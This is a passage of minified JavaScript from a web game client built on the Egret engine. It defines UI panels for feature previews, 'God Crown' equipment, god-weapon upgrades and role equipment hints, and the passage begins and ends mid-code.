e=t.call(this)||this;return e._sn_="funcShowPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.funList.itemRenderer=d.FuncShowItem,this.funList.dataProvider=this.eArc=new eui.ArrayCollection,this.rewardList.itemRenderer=s.ItemBaseEff6,this.rewardList.dataProvider=this.eRArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(h.GameLogic.ins().postFunsShow,this.updateCurReward),this.addTouchEvent(this.goGrp,this.onClick),this.rewardList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onListTap,this),this.funList.addEventListener(eui.PropertyEvent.PROPERTY_CHANGE,this.onSelectedIndexChange,this),this.updateView(),this.updateCurReward()},e.prototype.onClick=function(t){var e=this.funList.selectedItem;e&&e.systemUi&&r.Activity.ins().handleTurn(e.systemUi)},e.prototype.onListTap=function(t){var e=this.funList.selectedItem;if(e){var i=c.FuLiCT.ins().getFunsShowAwardById(e.id);if(2!=i)return 0==i?void p.TipsCT.ins().showTips(gettext("功能开启后可领取")):l.BagCT.ins().getAllSurplusCount(1)<0?void p.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void h.GameLogic.ins().sendFunsShowAward(e.id)}},e.prototype.onSelectedIndexChange=function(t){if("selectedIndex"==t.property){for(var e=0;e<this.funList.dataProvider.length;e++){var i=this.funList.getElementAt(e);i&&i.updateSelect()}this.updateCurReward(),this.goScrollTween()}},e.prototype.updateCurReward=function(){for(var t=0;t<this.funList.numChildren;t++){var e=this.funList.getChildAt(t);e.updateRed()}var i=this.funList.selectedItem;if(i){this.txtOpen.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("开启条件：")+i.openLimitTxt),this.txtDesc.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("简介：")+(i.dec||"")),this.txtJump.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("入口：")+i.entryDesc);var o=c.FuLiCT.ins().getFunsShowAwardById(i.id),s=!0;1!=c.FuLiCT.ins().getFunsShowAwardById(i.id)&&(s=!1);var a=i.showReward.map(function(t){return __assign(__assign({},t),{showEff:s,touchItem:!s,showGet:2==o})});this.eRArc.source=a,this.goGrp.visible=!!i.systemUi}this.updateRewardEffect()},e.prototype.updateRewardEffect=function(){},e.prototype.updateView=function(){var t=this.getForeshow();this.eArc.replaceAll(t);for(var e=u.GameServerCC.serverOpenDay+1,i=0;i<t.length;i++){var n=t[i];if(e<=n.recDay||i==t.length-1){this.funList.selectedIndex=i;break}}this.funScroll.viewport.scrollH=0,this.goScroll()},e.prototype.goScroll=function(){this.goScrollTween()},e.prototype.goScrollTween=function(){egret.Tween.removeTweens(this.funList);var t=this.funList.selectedIndex,e=270,i=t*e;i-=this.funList.width/2-e/2,egret.Tween.get(this.funList).to({scrollH:i},500,egret.Ease.quadOut)},e.prototype.getForeshow=function(){var t=[];for(var e in a.GlobalConfig.NewFuncNoticeConfig){var i=a.GlobalConfig.NewFuncNoticeConfig[e];c.FuLiCT.ins().checkFuncOpen(i)&&t.push(i)}return t.sort(this.sortFunc),t},e.prototype.sortFunc=function(t,e){return t.recDay-e.recDay},e.prototype.tabRp=function(){return c.FuLiCT.ins().funcShowRp.v},e.prototype.removeDisplay=function(){this.funList&&egret.Tween.removeTweens(this.funList)},__decorate([delayCall(500)],e.prototype,"goScroll",null),e}(o.BaseView);e.FuncShowPanel=f,window.FuncShowPanel=f,__reflect(f.prototype,"FuncShowPanel",[]),window.FuncShowPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MergeActivityMain=void 0;var n=i(57),o=i(402),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FuliActivityMainSkin",e.pageStyle=n.ActOnPlace.HeFu,e}return __extends(e,t),e}(o.FuliActivityMain);e.MergeActivityMain=s,window.MergeActivityMain=s,__reflect(s.prototype,"MergeActivityMain",[]),window.MergeActivityMain=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownPanel=void 0;var n=i(21),o=i(49),s=i(1),a=i(110),r=i(0),l=i(15),h=i(132),u=i(12),p=i(2),d=i(419),c=i(420),f=i(98),g=i(415),m=i(421),v=i(422),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CrownSkin",e.radius=200,e.highRa=0,e.objectCount=6,e.objAngle=[],e.objects=[],e.widthX=500,e.hightY=230,e.speed=.01,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=d.CrownAttrItem,this.eList.dataProvider=this.eList0=new eui.ArrayCollection,this.nList.itemRenderer=d.CrownAttrItem,this.nList.dataProvider=this.nList0=new eui.ArrayCollection,this.eqList.itemRenderer=d.CrownAttrItem,this.eqList.dataProvider=this.eqList0=new eui.ArrayCollection,this.cpList.itemRenderer=d.CrownAttrItem,this.cpList.dataProvider=this.cpList0=new eui.ArrayCollection,this.costCmlist0.itemRenderer=a.CostComRender,this._curCostArr1=new eui.ArrayCollection,this.costCmlist0.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap),observe(this,this.updateSelect,f.GodCrownCT.ins().updateCrownEquip),observe(this,this.UpdateCrownShow,f.GodCrownCT.ins().postCrownUpDateObserve),observe(this,this.UpdateCrownShow,f.GodCrownCT.ins().postCrownDateObserve),observe(this,this.UpdateCrownShow,f.GodCrownCT.ins().postCrownPartUpDateObserve),observe(this,this.setWearnIcon,f.GodCrownCT.ins().postUseCrownObserve);for(var t=0;6>t;t++)this.objects.push(this["eff"+t]),this.objAngle.push(0);for(var e=1;this["equip"+e];)this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this["equip"+e]),e++;this.CrownInitial.visible=!0,this.Crown.visible=!1,this.setInitAni()},e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve(),egret.stopTick(this.moveBall,this),this.removeTouchEvent(this,this.onTap);for(var t=1;this["equip"+t];)this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this["equip"+t]),t++}},e.prototype.onTap=function(t){var e;switch(t.target){case this.btnHelp:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[360])||void 0===e?void 0:e.text)||"");break;case this.Preview0:win.open(v.GodCrownSkillPanel);break;case this.crownskill:break;case this.levelBtn:var i=f.GodCrownCT.ins().returnEquipData(f.GodCrownCT.ins().crownEquip);if(!i||0==i.eqQuilty)return void p.TipsCT.ins().showTips(gettext("装备未附灵"));win.open(g.GodCrownComponentPanel);break;case this.qualityBtn:var n=f.GodCrownCT.ins().returnVBCrowId(f.GodCrownCT.ins().nowOpenId);if(!n)return void p.TipsCT.ins().showTips(gettext("神冠未激活"));win.open(m.GodCrownQualityPanel);break;case this.activateBtn:var o=r.GlobalConfig.CrownCfg[f.GodCrownCT.ins().nowOpenId];if(o&&!f.GodCrownCT.ins().judgeIsCan(o.cost))return void p.TipsCT.ins().showTips(gettext("材料不足"));f.GodCrownCT.ins().sendCrown(f.GodCrownCT.ins().nowOpenId);break;case this.returnBtn:this.changeEquips();break;case this.wearBtn:f.GodCrownCT.ins().sendUseCrown(f.GodCrownCT.ins().nowOpenId);break;case this.eff0:f.GodCrownCT.ins().nowOpenId=1,this.changeEquips();break;case this.eff1:f.GodCrownCT.ins().nowOpenId=2,this.changeEquips();break;case this.eff2:f.GodCrownCT.ins().nowOpenId=3,this.changeEquips();break;case this.eff3:f.GodCrownCT.ins().nowOpenId=4,this.changeEquips();break;case this.eff4:f.GodCrownCT.ins().nowOpenId=5,this.changeEquips();break;case this.eff5:f.GodCrownCT.ins().nowOpenId=6,this.changeEquips()}},e.prototype.changeEquips=function(){this.CrownInitial.visible=!this.CrownInitial.visible,this.Crown.visible=!this.Crown.visible,this.CrownInitial.visible?this.iniCrownShow(!1):this.iniCrownShow(!0)},e.prototype.UpdateCrownShow=function(){this.iniCrownShow(!0)},e.prototype.iniCrownShow=function(t){var e,i;if(this.costGrop.visible=!1,this.wearBtn.visible=!1,this.qualityBtn.visible=!1,this.levelBtn.visible=!1,t)this.setCrownEquipData(),this.title1.visible=!1,this.equipattr.visible=!1,this.componentattr.visible=!1,this.crownattr.visible=!0,this.title0.visible=!0,this.setCostAndBtn(),this.aniShow(),this.showLine(),this.setWearnIcon(),this.qualityBtn.visible&&(this.qualityBtn.eRp.visible=f.GodCrownCT.ins().returnEquipBtnQualityRed(),this.levelBtn.eRp.visible=f.GodCrownCT.ins().returnEquipPartBtnRed());else{var n=r.GlobalConfig.CrownCfg;if(n){var o=[];for(var s in n){var a=f.GodCrownCT.ins().returnCrownAttr(n[s].id);for(var l in a)o.push(a[l])}var h=f.GodCrownCT.ins().GodCrownDadaList,u=r.GlobalConfig.CrownAttrCfg,p=[];if(u)for(var s in h)if(h[s]&&(null===(e=h[s])||void 0===e?void 0:e.eqQuilty)>0&&(null===(i=h[s])||void 0===i?void 0:i.eqCount)>0){var d=u[h[s].crownId];if(d){var c=[],g=h[s].arr0,m=g.length;if(m>0){var v=[];for(var y in d)m>=+y&&v.push(+y);for(var C in v){var T=d[v[C]];for(var b in T){var w=0;for(var I in g)g[I].eqQuilty>=+b&&w++;w>=v[C]&&(c[0]={crownId:h[s].crownId,quality:+b,count:v[C]})}}}if(c.length>0){f.GodCrownCT.ins().hasActCount++;var _=d[c[0].count][c[0].quality];f.GodCrownCT.ins().nowShowAttrQ[c[0].crownId]=c[0].quality,p.push(_)}}}for(var S in p){var x=p[S].attr;if(x)for(var D in x)o.push(x[D])}for(var l in o){for(var s in f.GodCrownCT.ins().atrrValueArr)o[l].type==f.GodCrownCT.ins().atrrValueArr[s].type&&o.push({type:f.GodCrownCT.ins().atrrValueArr[s].type,value:f.GodCrownCT.ins().atrrValueArr[s].value});for(var s in f.GodCrownCT.ins().atrrValueArr0)o[l].type==f.GodCrownCT.ins().atrrValueArr0[s].type&&o.push({type:f.GodCrownCT.ins().atrrValueArr0[s].type,value:f.GodCrownCT.ins().atrrValueArr0[s].value})}var A=f.GodCrownCT.ins().returnArrs(o),k=f.GodCrownCT.ins().returnAttStr(A),B=k.split("\n");""!=k?this.eList0.replaceAll(B):this.eList0.replaceAll([]),this.initCrownRed(),this.updateCrownEff()}}},e.prototype.setCostAndBtn=function(){var t=f.GodCrownCT.ins().returnVBCrowId(f.GodCrownCT.ins().nowOpenId);if(t)this.costGrop.visible=!1,this.wearBtn.visible=!0;else{this.costGrop.visible=!0,this.wearBtn.visible=!1;var e=r.GlobalConfig.CrownCfg[f.GodCrownCT.ins().nowOpenId];if(e){var i=[];for(var n in e.cost)i.push({cost:{type:e.cost[n].type,id:e.cost[n].id,count:e.cost[n].count},isShowHas:!0,isShowXh:!1});this._curCostArr1.source=i,this._curCostArr1.refresh()}}var o=r.GlobalConfig.CrownCfg;if(o){var s=[],a=f.GodCrownCT.ins().returnCrownAttr(f.GodCrownCT.ins().nowOpenId);for(var l in a)s.push(a[l]);for(var l in s){for(var h in f.GodCrownCT.ins().atrrValueArr)s[l].type==f.GodCrownCT.ins().atrrValueArr[h].type&&s.push({type:f.GodCrownCT.ins().atrrValueArr[h].type,value:f.GodCrownCT.ins().atrrValueArr[h].value});for(var h in f.GodCrownCT.ins().atrrValueArr0)s[l].type==f.GodCrownCT.ins().atrrValueArr0[h].type&&s.push({type:f.GodCrownCT.ins().atrrValueArr0[h].type,value:f.GodCrownCT.ins().atrrValueArr0[h].value})}var u=f.GodCrownCT.ins().returnArrs(s),p=f.GodCrownCT.ins().returnAttStr(u),d=p.split("\n");""!=p?this.nList0.replaceAll(d):this.nList0.replaceAll([])}},e.prototype.initCrownRed=function(){var t=r.GlobalConfig.CrownCfg;if(t)for(var e in t){var i=this["rp"+(+e-1)];i&&(f.GodCrownCT.ins().returnCownRed(+e)?i.visible=!0:i.visible=!1)}},e.prototype.setWearnIcon=function(){this.wearBtn.touchEnabled=f.GodCrownCT.ins().nowOpenId!=f.GodCrownCT.ins().outDrawValue,this.wearBtn.filters=f.GodCrownCT.ins().nowOpenId!=f.GodCrownCT.ins().outDrawValue?o.FilterUtil.normalColor:o.FilterUtil.ARRAY_GRAY_FILTER},e.prototype.initGodCrown=function(){egret.startTick(this.moveBall,this),this.layoutObjects(),this.initCenter(),this.startAnimation()},e.prototype.layoutObjects=function(){for(var t=2*Math.PI/this.objectCount,e=0;e<this.objectCount;e++){var i=t*e+t/2,n=(this.radius+this.highRa)*Math.sin(i)+this.hightY,o=this.radius*Math.cos(i)-this.widthX;this.objects[e].x=o,this.objects[e].y=n,this.objAngle[e]=i}},e.prototype.initCenter=function(){this.centerX=this.widthX/2,this.centerY=this.hightY},e.prototype.setInitAni=function(){this.iniCrownShow(!1);var t=r.GlobalConfig.CrownCfg;if(t){for(var e=6;e>=1;e--){var i=this["eff"+(e-1)];if(1==i.numElements){var s=new n.MovieClip;i.addChild(s),s.playFile(RES_DIR_EFF+t[e].appearance,-1),s.scaleX=s.scaleY=t[e].size1,s.x=i.width/2,s.y=i.height/2;var a=f.GodCrownCT.ins().returnVBCrowId(e);a?(s.filters=o.FilterUtil.normalColor,this["crown"+e].filters=o.FilterUtil.normalColor):(s.filters=o.FilterUtil.ARRAY_GRAY_FILTER,this["crown"+e].filters=o.FilterUtil.ARRAY_GRAY_FILTER)}}this.mcs=new n.MovieClip,this.crowneff.addChild(this.mcs),this.mcs.x=this.crowneff.width/2,this.mcs.y=this.crowneff.height/2}this.initCrownRed()},e.prototype.updateCrownEff=function(){var t=r.GlobalConfig.CrownCfg;if(t)for(var e=6;e>=1;e--){var i=this["eff"+(e-1)];if(2==i.numElements){var n=i.getChildAt(1);if(n){var s=f.GodCrownCT.ins().returnVBCrowId(e);s?(n.filters=o.FilterUtil.normalColor,this["crown"+e].filters=o.FilterUtil.normalColor):(n.filters=o.FilterUtil.ARRAY_GRAY_FILTER,this["crown"+e].filters=o.FilterUtil.ARRAY_GRAY_FILTER)}}}},e.prototype.startAnimation=function(){egret.startTick(this.moveBall,this)},e.prototype.moveBall=function(t){for(var e=5;e>=0;e--){var i=this["eff"+e];if(i){this.objAngle[e]+=this.speed;var n=this.centerX+this.radius*Math.cos(this.objAngle[e]),o=this.centerY+this.radius*Math.sin(this.objAngle[e]);i.x=n,i.y=o}}return!0},e.prototype.setCrownEquipData=function(){var t=r.GlobalConfig.CrownEquipCfg[f.GodCrownCT.ins().nowOpenId];if(f.GodCrownCT.ins().nowOpenEquipCount=0,t){for(var e in t)f.GodCrownCT.ins().nowOpenEquipCount++;for(var e=1;e<=f.GodCrownCT.ins().nowOpenEquipCount;e++)this["equip"+e].data=t[e][1]}this.crownname.source="crown_name"+f.GodCrownCT.ins().nowOpenId},e.prototype.setCostValue=function(){this.qualityBtn.visible=!0,this.levelBtn.visible=!0,this.equipattr.visible=!0,this.componentattr.visible=!0,this.title1.visible=!0,this.title0.visible=!1,this.crownattr.visible=!1,this.qualityBtn.eRp.visible=f.GodCrownCT.ins().returnEquipBtnQualityRed(),this.levelBtn.eRp.visible=f.GodCrownCT.ins().returnEquipPartBtnRed()},e.prototype.onClick=function(t){if(t.target instanceof c.CrownEquipItem){var e=t.target;e&&e.onClick()}},e.prototype.updateSelect=function(){for(var t=1;8>=t;t++){var e=this["equip"+t];e&&e.updateSelect()}this.setCostValue(),this.updateEquipQualityData(),this.updateEquipPartData()},e.prototype.updateEquipPartData=function(){var t,e=f.GodCrownCT.ins().returnEquipAttr(),i=f.GodCrownCT.ins().returnArrs(e),n=h.NebulaCT.ins().returnAttStr(i);t=""!=n?n.split("\n"):[],this.cpList0.replaceAll(t)},e.prototype.updateEquipQualityData=function(){var t,e=f.GodCrownCT.ins().returnQulAttr(),i=f.GodCrownCT.ins().returnArrs(e),n=h.NebulaCT.ins().returnAttStr(i);t=""!=n?n.split("\n"):[],this.eqList0.replaceAll(t)},e.prototype.aniShow=function(){var t=r.GlobalConfig.CrownCfg[f.GodCrownCT.ins().nowOpenId];this.mcs.playFile(RES_DIR_EFF+t.appearance,-1),this.mcs.scaleX=this.mcs.scaleY=t.size1;var e=f.GodCrownCT.ins().returnVBCrowId(f.GodCrownCT.ins().nowOpenId);e?(this.mcs.filters=o.FilterUtil.normalColor,this.crownname.filters=o.FilterUtil.normalColor):(this.mcs.filters=o.FilterUtil.ARRAY_GRAY_FILTER,this.crownname.filters=o.FilterUtil.ARRAY_GRAY_FILTER)},e.prototype.showLine=function(){var t=f.GodCrownCT.ins().returnVBCrowId(f.GodCrownCT.ins().nowOpenId);if(t)for(var e=t.arr0,i=1;i<=f.GodCrownCT.ins().nowOpenEquipCount;i++){var n=this["line"+i],s=!0;for(var a in e)if(e[a].eqId==i&&e[a].eqQuilty>0&&n){n.filters=o.FilterUtil.normalColor,s=!1;break}s&&n&&(n.filters=o.FilterUtil.ARRAY_GRAY_FILTER)}else for(var i=1;i<=f.GodCrownCT.ins().nowOpenEquipCount;i++){var n=this["line"+i];n&&(n.filters=o.FilterUtil.ARRAY_GRAY_FILTER)}},e.prototype.tabRp=function(){return f.GodCrownCT.ins().AllBagRed.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=u.OpenSystem.ins().checkSysOpen(l.SystemType.GodCrown);return i||p.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(l.SystemType.GodCrown)),i},e}(s.BaseView);e.GodCrownPanel=y,window.GodCrownPanel=y,__reflect(y.prototype,"GodCrownPanel",[]),window.GodCrownPanel=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GwWeaponView=void 0;var n=i(21),o=i(19),s=i(5),a=i(1),r=i(22),l=i(34),h=i(0),u=i(36),p=i(4),d=i(13),c=i(59),f=i(65),g=i(2),m=i(424),v=i(254),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GwWeapon",e.idx=0,e.curId=0,e}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.updateView,v.GodWeaponCC.ins().postInfo),this.list1.itemRenderer=m.GwWeaponItem,this.list1.dataProvider=new eui.ArrayCollection([]),this.initList(),this.changeEff(),this.updateView(),this.list1.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.addTouchEvent(this.btn0,this.OnClick),this.addTouchEvent(this.btn1,this.OnClick)},e.prototype.initList=function(){for(var t=[],e=h.GlobalConfig.GodWeaponLvConfig,i=1e3;;){if(!e[i])break;t.push(e[i].id),i+=1e3}this.list1.dataProvider=new eui.ArrayCollection(t),this.list1.selectedIndex=this.idx,this.curId=t[this.idx],this.list1.validateNow()},e.prototype.updateView=function(){var t=v.GodWeaponCC.ins().getInfo(this.curId);if(t){var e=h.GlobalConfig.GodWeaponLvConfig[t.id];if(e){this.titleImg.source="shenbingbt0"+(this.list1.selectedIndex+1),this.lvlab.text="Lv"+e.lv,this.cost2.text=""+e.level,this.cost2.textColor=p.ActorCC.level>=e.level?2149168:16720161;var i=h.GlobalConfig.GodWeaponLvConfig[t.id+1];this.btn0.visible=i?!0:!1,this.btn1.visible=this.btn0.visible,this.updateItemList(),this.updateAttr(e,t),this.updateInfo(e,t),this.updateBar(e)}}},e.prototype.updateInfo=function(t,e){var i=p.ActorCC.getCurrencyByType(u.MoneyConst.stone);if(this.upGrp.visible=void 0==t.cost?!1:!0,this.upGrp.visible){var n=t.cost[0].count,o=i>=n?2149168:16720161;this.cost0.textFlow=(new egret.HtmlTextParser).parse("<a color = "+o+">"+i+"/"+t.cost[0].count+"</a>"),i=p.ActorCC.gold,n=t.cost[1].count;var a=i>=n?2149168:16720161;this.cost1.textFlow=(new egret.HtmlTextParser).parse("<a color = "+a+">"+t.cost[1].count+"</a>")}for(var r=h.GlobalConfig.GodWeaponLvConfig[this.curId],l=0,d=0;d<r.levelStage.length;d++)e.skillLv>d&&(l+=r.levelStage[d]);var c=0==e.skillLv?r:h.GlobalConfig.GodWeaponLvConfig[this.curId+l],g=c.skillCost;this.skillCost0.text=""+c.skillLevel,this.skillCost0.textColor=t.lv>=c.skillLevel?2149168:16711680,this.skillGrp.visible=!g||e.skillLv>=c.skillLevel?!1:!0,this.btn1.visible=this.skillGrp.visible,this.skillMaxLab.visible=!this.skillGrp.visible;var m=r.passiveSkill+e.skillLv;if(m){var v=h.GlobalConfig.SkillsConfig[m];if(!v&&e.skillLv)for(var y=m--;;)if(y=m--,h.GlobalConfig.SkillsConfig[y]){v=h.GlobalConfig.SkillsConfig[y];break}this.skilldes.textFlow=s.TextFlowMaker.generateTextFlow(f.SkillUtil.getDesc(v)||"")}this.skillGrp.visible&&g&&(this.skillCostCm2.setData(g[0],!1,!1),this.skillCostCm1.setData(g[1],!1,!0))},e.prototype.updateAttr=function(t,e){for(var i,n=d.SubRoles.ins().getSubRoleByIndex(0),o=t["attr_"+n.job],s="",a="",u=h.GlobalConfig.GodWeaponLvConfig[e.id+1],p=0;p<o.length;p++){var c=r.AttributeData.getAttrStrByType(o[p].type);if(s+=""!==c?c+": ":" ",u){var f=null===(i=u["attr_"+n.job])||void 0===i?void 0:i[p],g=(null===f||void 0===f?void 0:f.type)||0,m=(null===f||void 0===f?void 0:f.value)||0;m>o[p].value&&(a+=g==l.AttributeType.atAtkMax||g==l.AttributeType.atAtkMageMax||g==l.AttributeType.atAtkTaoistMax||g==l.AttributeType.atRes?"<a color= 2149168> - "+(m-o[p].value)+"</a>":"<a color= 2149168>+"+(m-o[p].value)+"</a>")}s+=o[p].value;var v=o[p].type;v==l.AttributeType.atAtkMin||v==l.AttributeType.atAtkMageMin||v==l.AttributeType.atAtkTaoistMin||v==l.AttributeType.atDef?s+=" -":v==l.AttributeType.atAtkMax||v==l.AttributeType.atAtkMageMax||v==l.AttributeType.atAtkTaoistMax||v==l.AttributeType.atRes?(s+="\n",a+="\n"):""!=s&&(s+="\n",a+="\n")}this.attr.textFlow=(new egret.HtmlTextParser).parse(""+s),this.attrAdd.textFlow=(new egret.HtmlTextParser).parse(""+a)},e.prototype.updateBar=function(t){var e=h.GlobalConfig.GodWeaponLvConfig[this.curId].levelStage[t.lv];this.barLab.text=t.stage+"/"+e,this.bar.value=t.stage/e*100},e.prototype.changeEff=function(){null==this.effect&&(this.effect=new n.MovieClip,this.effGrp.addChild(this.effect)),this.effect.playFile(RES_DIR_EFF+("shenbing0"+(this.list1.selectedIndex+1)),-1)},e.prototype.onItemClick=function(t){t.itemIndex!=this.idx&&(this.idx=t.itemIndex,this.curId=t.item,this.updateView(),this.changeEff())},e.prototype.updateItemList=function(){for(var t=0;t<this.list1.numElements;t++){var e=this.list1.getElementAt(t);e.eRp.visible=v.GodWeaponCC.ins().lvRps[t].v||!1}},e.prototype.OnClick=function(t){var e=v.GodWeaponCC.ins().getInfo(this.curId);if(e){var i=h.GlobalConfig.GodWeaponLvConfig[e.id];if(i)switch(t.target){case this.btn0:if(p.ActorCC.level<i.level)return g.TipsCT.ins().showTips(gettext("角色等级不足")),void c.GameFlashSaleCt.ins().reportLvNot();for(var n=i.cost,s=0;s<n.length;s++)if(!o.GlobalFun.checkCost(n[s].count,n[s].id))return void c.GameFlashSaleCt.ins().reportShenBingMaterialNot();v.GodWeaponCC.ins().sendUp(this.idx+1,1);break;case this.btn1:for(var a=h.GlobalConfig.GodWeaponLvConfig[this.curId],r=0,s=0;s<a.levelStage.length;s++)e.skillLv>s&&(r+=a.levelStage[s]);var l=0==e.skillLv?a:h.GlobalConfig.GodWeaponLvConfig[this.curId+r];if(i.lv<l.skillLevel)return g.TipsCT.ins().showTips(gettext("神兵等级不足")),void c.GameFlashSaleCt.ins().reportShenBingMaterialNot();if(e.skillLv>=l.skillLevel)return g.TipsCT.ins().showTips(gettext("超出技能上限")),void c.GameFlashSaleCt.ins().reportShenBingMaterialNot();for(var u=l.skillCost||[],s=0;s<u.length;s++)if(!o.GlobalFun.checkCost(u[s].count,u[s].id))return void c.GameFlashSaleCt.ins().reportShenBingMaterialNot();v.GodWeaponCC.ins().sendUp(this.idx+1,2)}}},e.prototype.tabRp=function(){return v.GodWeaponCC.ins().rp.v},e}(a.BaseView);e.GwWeaponView=y,window.GwWeaponView=y,__reflect(y.prototype,"GwWeaponView",[]),window.GwWeaponView=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleCT=void 0;var n=i(14),o=i(0),s=i(4),a=i(13),r=i(6),l=i(10),h=i(155),u=i(161),p=i(934),d=i(23),c=i(188),f=i(113),g=i(223),m=i(26),v=i(38),y=function(t){function e(){var e=t.call(this)||this;return e.timeID=0,e.canChangeEquips=[[],[],[]],observe(e,e.startCheckHaveCan,r.BagCT.ins().postItemChange,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemDel,s.ActorCC.postLevelChange,d.GameLogic.ins().postSubRoleChange,v.EquipCT.ins().postEquipChange,Ts.wingBoost.levelup),observe(e,e.delayShowNavBtnRedPoint,s.ActorCC.postGoldChange,d.GameLogic.ins().postRuneExchange,d.GameLogic.ins().postRuneShatter,s.ActorCC.init,h.DemonCirRedPoint.ins().postRedPoint),e}return __extends(e,t),e.prototype.startCheckHaveCan=function(t,e){var i=this;void 0===t&&(t=!1),void 0===e&&(e=-1),this.timeID||(this.timeID=1,Timer.start(50,1,function(){i.checkHaveCan(t,e)},this))},e.ins=function(){return t.ins.call(this)},e.prototype.checkHaveCan=function(t,e){void 0===t&&(t=!1),void 0===e&&(e=-1),this.timeID=0;for(var i=r.BagCT.ins().getBagEquipByType(0),n=a.SubRoles.ins(),o=e>=0?e:0,h=e>=0?e+1:n.subRolesLen,u=[[],[],[]],p=n.subRolesLen,d=0;p>d;d++)for(var c=0,f=n.getSubRoleByIndex(d).equipsData;c<f.length;c++){var g=f[c];u[d].push(g.item)}for(var v=0,y=i;v<y.length;v++)for(var C=y[v],T=o;h>T;T++){var b=l.ItemUtil.getJob(C.itemConfig);if((0==b||a.SubRoles.ins().getSubRoleByIndex(T).job==b)&&!(m.ZsCT.ins().stage<C.itemConfig.zsLevel||s.ActorCC.level<C.itemConfig.level)){var w=r.BagCT.ins().getLowEquipIndex(u[T],l.ItemUtil.getSubType(C.itemConfig));w>=0&&(u[T][w]=this.contrastEquip(u[T][w]||n.getSubRoleByIndex(T).equipsData[w].item,C))}}for(var I=u.length,d=0;I>d;d++){for(var T=0;T<u[d].length;T++)this.canChangeEquips[d][T]=!1,u[d][T]&&u[d][T].handle!=n.getSubRoleByIndex(d).equipsData[T].item.handle&&(t&&e==d?(sendSync(Ts.WearEquip,{handle:u[d][T].handle,pos:T,roleId:e}),this.canChangeEquips[d][T]=!1):this.canChangeEquips[d][T]=!0);this.canChangeEquips[d].indexOf(!0)<0&&(this.canChangeEquips[d].length=0)}this.showNavBtnRedPoint()},e.prototype.contrastEquip=function(t,e){if(!t||0==t.handle)return e;if(!e||0==e.handle)return t;var i=t.point,n=e.point;return n>i?e:t},e.prototype.getCanChangeEquips=function(){for(var t=0,e=this.canChangeEquips;t<e.length;t++)for(var i=e[t],n=0,o=i;n<o.length;n++){var s=o[n];if(s)return!0}return!1},e.prototype.delayShowNavBtnRedPoint=function(){this.showNavBtnRedPoint()},e.prototype.showNavBtnRedPoint=function(t){void 0===t&&(t=!1),t=this.getCanChangeEquips(),!t&&u.Dress.ins().redPoint()&&(t=!0),!t&&c.RuneRedPointMgr.ins().checkAllSituation(!1)&&(t=!0),t||(t=a.SubRoles.ins().isLockRole()),t||(t=p.ThunderRedPoint.ins().redPoint),t||(t=h.DemonCirRedPoint.ins().redPoint),t||(t=g.WushuangRP.ins().getRoleRp()),t||(t=f.TunTianEquipSystem.ins().rp.v),this.postRoleHint(t)},e.prototype.postRoleHint=function(t){return t?1:0},e.prototype.and=function(t){for(var e=0,i=t;e<i.length;e++){var n=i[e];if(1==n)return!0}return!1},e.prototype.seekRoleItem=function(){for(var t=!1,e=r.BagCT.ins().getBagItemNum(0),i=0;e>i;i++){if(t)return t;var n=r.BagCT.ins().getBagGoodsByIndex(0,i);switch(n.itemConfig.id){case 200001:break;case 200004:t=this.roleHint(5);break;case 200013:t=this.roleHint(0);break;case 200014:t=this.roleHint(1)}}return t},e.prototype.roleHint=function(t){for(var e=0,i=a.SubRoles.ins().roles;e<i.length;e++){var n=i[e];if(this.roleHintCheck(n,t))return!0}return!1},e.prototype.roleHintCheck=function(t,e){var i=1,n=0,s=0,a=0;switch(e){case 0:var l=o.GlobalConfig.ExRing0Config[i];if(i>=1)return!1;l&&(n=l.cost,a=o.GlobalConfig.ExRingConfig[0].costItem);break;case 1:var h=o.GlobalConfig.ExRing1Config[i];if(i>=1)return!1;h&&(n=h.cost,a=o.GlobalConfig.ExRingConfig[1].costItem);break;case 5:i=t.jingMaiData.level;var u=o.GlobalConfig.JingMaiLevelConfig[i];u&&(n=u.count,a=u.itemId)}return n&&(s=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,a),s>=n)?!0:!1},e.prototype.setCanChange=function(){},e.oneKeyOpenLevel=60,__decorate([delayCall(100)],e.prototype,"delayShowNavBtnRedPoint",null),__decorate([post()],e.prototype,"postRoleHint",null),e}(n.BaseSystem);e.RoleCT=y,window.RoleCT=y,__reflect(y.prototype,"RoleCT",[]),Systemap.RoleCT=function(){return y.ins()},window.RoleCT=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ThunderRedPoint=void 0;var n=i(14),o=i(13),s=function(t){function e(){var e=t.call(this)||this;return e.redPoint=!1,e.composePoint=[],e.roleTabs=[],e.composeItemPoints=[],e.awakeItemPoints=[],e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=this.redPoint?1:0;this.redPoint=!1;return;for(var 